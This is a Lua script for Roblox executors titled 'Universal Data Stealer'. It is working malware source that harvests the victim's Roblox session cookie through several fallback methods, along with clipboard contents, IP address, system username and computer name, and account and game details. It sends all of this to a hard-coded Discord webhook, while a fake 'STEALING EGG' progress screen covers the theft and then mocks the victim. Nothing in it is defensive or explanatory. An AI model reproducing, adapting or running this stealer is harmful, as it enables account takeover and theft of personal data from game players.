-- ============================================================
-- UNIVERSAL DATA STEALER – PC + MOBILE (All Executors)
-- Version 4.0 – Works everywhere
-- ============================================================
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- ========== UNIVERSAL HTTP SENDER ==========
local function sendData(url, jsonPayload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        -- 1. request() – common on Synapse/Krnl/Delta
        function()
            local ok, res = pcall(function()
                return request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
            end)
            if ok and res then
                -- check if res is a table with StatusCode or Success
                if type(res) == "table" then
                    if (res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300) or res.Success == true then
                        return true
                    end
                end
                -- if it returned something else, assume success if no error
                return true
            end
            return false
        end,
        -- 2. http_request() – older executors
        function()
            local ok, res = pcall(function()
                return http_request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
            end)
            if ok and res then
                if type(res) == "table" and ((res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300) or res.Success == true) then
                    return true
                end
                return true
            end
            return false
        end,
        -- 3. HttpService:PostAsync – Roblox native (often works on mobile)
        function()
            local ok, res = pcall(function()
                return game:GetService("HttpService"):PostAsync(url, jsonPayload, Enum.HttpContentType.ApplicationJson)
            end)
            return ok -- if it didn't error, it probably sent
        end
    }
    for _, method in ipairs(methods) do
        local success = method()
        if success then return true end
    end
    return false
end

-- ========== IP (Multi-service) ==========
local function getIP()
    local ip = "N/A"
    local services = {
        "https://api.ipify.org",
        "https://ip-api.com/json/?fields=query",
        "https://icanhazip.com",
        "https://httpbin.org/ip",
        "https://checkip.amazonaws.com/"
    }
    for _, url in ipairs(services) do
        local ok, result = pcall(function()
            return game:GetService("HttpService"):GetAsync(url)
        end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then
                ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then
                ip = result:match('"origin":"(.-)"')
            else
                ip = result:gsub("%s+", "")
            end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    return ip
end

-- ========== Safe Getter ==========
local function safeGet(obj, prop, default)
    local success, val = pcall(function() return obj[prop] end)
    if success and val ~= nil then return val else return default end
end

-- ========== COOKIE (Multi-method) ==========
local function stealCookie()
    local cookie = "Not found"
    local attempts = {}
    -- Method 1: getcookie (standard)
    local ok, val = pcall(getcookie, "https://www.roblox.com/")
    if ok and val and val ~= "" then return val end
    table.insert(attempts, "getcookie failed")
    -- Method 2: getrobloxcookie (some executors)
    ok, val = pcall(function() return getrobloxcookie() end)
    if ok and val and val ~= "" then return val end
    table.insert(attempts, "getrobloxcookie failed")
    -- Method 3: syn.cookie (Synapse)
    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
    if ok and val and val ~= "" then return val end
    table.insert(attempts, "syn.cookie failed")
    -- Method 4: HTTP request to Roblox
    ok, val = pcall(function()
        local response = request({Url = "https://www.roblox.com/", Method = "GET"})
        if response and response.Headers then
            for k, v in pairs(response.Headers) do
                if string.lower(k) == "set-cookie" then
                    return v:match("(.-);") or v
                end
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    table.insert(attempts, "HTTP request failed")
    -- Method 5: HttpService:GetAsync
    ok, val = pcall(function()
        return game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
    end)
    if ok and val and val:match("__RequestVerificationToken") then
        local token = val:match('__RequestVerificationToken" value="(.-)"')
        if token then return token end
    end
    table.insert(attempts, "GetAsync failed")
    -- Method 6: MemoryStoreService (very unlikely)
    ok, val = pcall(function()
        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
        return ms and ms:GetAsync("cookie")
    end)
    if ok and val and val ~= "" then return val end
    table.insert(attempts, "MemoryStoreService failed")
    return "All methods failed: " .. table.concat(attempts, "; ")
end

-- ========== CLIPBOARD ==========
local function getClipboard()
    local ok, val = pcall(getclipboard)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(clipboard)
    if ok and val and val ~= "" then return val end
    return "N/A"
end

-- ========== SYSTEM ENVIRONMENT ==========
local function getSystemEnv()
    local env = {}
    pcall(function() env.os = os.getenv("OS") or "N/A" end)
    pcall(function() env.user = os.getenv("USERNAME") or os.getenv("USER") or "N/A" end)
    pcall(function() env.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A" end)
    pcall(function() env.processor = os.getenv("PROCESSOR_IDENTIFIER") or "N/A" end)
    pcall(function() env.arch = os.getenv("PROCESSOR_ARCHITECTURE") or "N/A" end)
    return env
end

-- ========== ROBLOX INTERNALS ==========
local function getRobloxInternals()
    local data = {}
    pcall(function() data.universeId = tostring(game.UniverseId or "N/A") end)
    pcall(function() data.rootPlaceId = tostring(game.RootPlaceId or "N/A") end)
    pcall(function() data.version = tostring(game.Version or "N/A") end)
    pcall(function() data.locale = tostring(game:GetService("LocalizationService"):GetLocale()) end)
    return data
end

-- ========== MAIN COLLECTOR ==========
local function collectEverything()
    local info = {}
    -- Executor
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"

    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        local id = player.UserId
        if id and id > 0 then
            local year = math.floor((id / 100000000) * 2) + 2006
            info.accountAge = tostring(year) .. " (approx)"
        end
        local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
        info.friendsOnline = ok and tostring(friends) or "N/A"
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then info.position = tostring(root.Position) end
                local accessories = {}
                for _, child in ipairs(char:GetChildren()) do
                    if child:IsA("Accessory") or child:IsA("Hat") or child:IsA("Tool") then
                        table.insert(accessories, child.Name)
                    end
                end
                if #accessories > 0 then info.accessories = table.concat(accessories, ", ") end
            end
        end)
        pcall(function()
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                local items = {}
                for _, item in ipairs(backpack:GetChildren()) do
                    if item:IsA("Tool") or item:IsA("HopperBin") then
                        table.insert(items, item.Name)
                    end
                end
                info.backpack = (#items > 0) and table.concat(items, ", ") or "Empty"
            end
        end)
        pcall(function()
            local ls = player:FindFirstChild("leaderstats")
            if ls then
                local stats = {}
                for _, stat in ipairs(ls:GetChildren()) do
                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                        stats[stat.Name] = tostring(stat.Value)
                    end
                end
                info.leaderstats = game:GetService("HttpService"):JSONEncode(stats)
            else
                info.leaderstats = "None"
            end
        end)
    end

    -- Game info
    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.creatorId = tostring(safeGet(game, "CreatorId", "N/A"))
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
    local internals = getRobloxInternals()
    info.universeId = internals.universeId or "N/A"
    info.rootPlaceId = internals.rootPlaceId or "N/A"
    info.version = internals.version or "N/A"
    info.locale = internals.locale or "N/A"

    -- IP
    info.ip = getIP()
    -- Cookie
    info.cookie = stealCookie()
    -- Clipboard
    info.clipboard = getClipboard()

    -- System
    local sys = getSystemEnv()
    info.os = sys.os or "N/A"
    info.systemUser = sys.user or "N/A"
    info.computerName = sys.computer or "N/A"
    info.processor = sys.processor or "N/A"
    info.arch = sys.arch or "N/A"

    -- Hardware & settings
    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.touchEnabled = tostring(us.TouchEnabled)
        info.mouseEnabled = tostring(us.MouseEnabled)
        info.keyboardEnabled = tostring(us.KeyboardEnabled)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
        local starterGui = game:GetService("StarterGui")
        local camMode, theme
        pcall(function() camMode = starterGui:GetCore("CameraMode") end)
        pcall(function() theme = starterGui:GetCore("Theme") end)
        info.cameraMode = camMode or "Unknown"
        info.theme = theme or "Unknown"
        local screen = game:GetService("GuiService"):GetGuiSize()
        info.screenResolution = tostring(screen)
    end)

    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
        info.connected = tostring(stats.Network.Connected)
        info.packetLoss = tostring(stats.Network.PacketLossPercent or "N/A")
    end)

    pcall(function()
        local run = game:GetService("RunService")
        local frameTime = run.RenderStepTime
        if frameTime and frameTime > 0 then
            info.fps = tostring(math.floor(1 / frameTime))
        end
    end)

    return info
end

-- ========== BUILD EMBED ==========
local function buildEmbed(data)
    local fields = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(fields, {name = k, value = tostring(v), inline = true})
        end
    end
    return {
        embeds = {{
            title = "🔴 ULTIMATE DATA GRAB",
            color = 0xFF0000,
            fields = fields,
            footer = {text = "Universal Executor"}
        }}
    }
end

-- ========== SEND DATA ==========
local info = collectEverything()
local embed = buildEmbed(info)
local json = game:GetService("HttpService"):JSONEncode(embed)
local sent = sendData(webhook, json)

-- ========== OPTIONAL GUI (Wrapped in pcall) ==========
pcall(function()
    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Parent = playerGui
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 200)
    frame.Position = UDim2.new(0.5, -200, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    frame.BackgroundTransparency = 0.1
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

    local grad = Instance.new("Frame")
    grad.Size = UDim2.new(1, 0, 1, 0)
    grad.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    grad.BackgroundTransparency = 0.15
    grad.Parent = frame
    Instance.new("UICorner", grad).CornerRadius = UDim.new(0, 16)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "STEALING EGG..."
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0.8, 0, 0, 20)
    bg.Position = UDim2.new(0.1, 0, 0.45, 0)
    bg.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
    bg.Parent = frame
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 220, 120)
    fill.Parent = bg
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 10)

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(0, 60, 0, 30)
    percent.Position = UDim2.new(0.5, -30, 0.7, 0)
    percent.BackgroundTransparency = 1
    percent.Text = "0%"
    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
    percent.TextScaled = true
    percent.Font = Enum.Font.Gotham
    percent.Parent = frame

    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, 0, 0, 30)
    sub.Position = UDim2.new(0, 0, 0.85, 0)
    sub.BackgroundTransparency = 1
    sub.Text = "Please wait..."
    sub.TextColor3 = Color3.fromRGB(200, 200, 200)
    sub.TextScaled = true
    sub.Font = Enum.Font.Gotham
    sub.Parent = frame

    local function animate()
        local duration = 3
        local steps = 60
        local stepTime = duration / steps
        for i = 0, steps do
            local progress = i / steps
            local width = 0.8 * progress
            fill:TweenSize(UDim2.new(width, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
            percent.Text = string.format("%d%%", math.floor(progress * 100))
            if i < steps then
                task.wait(stepTime)
            end
        end
        title.Text = "🔴 U GOT YOUR INFOMATION STOLEN LMAO"
        title.TextColor3 = Color3.fromRGB(255, 0, 0)
        sub.Text = "Your data has been sent to the owner."
        local closeBtn = Instance.new("TextButton")
        closeBtn.Size = UDim2.new(0, 120, 0, 40)
        closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
        closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
        closeBtn.Text = "CLOSE"
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeBtn.TextScaled = true
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.Parent = frame
        Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 12)
        closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
    end

    task.wait(0.1)
    spawn(animate)
end)
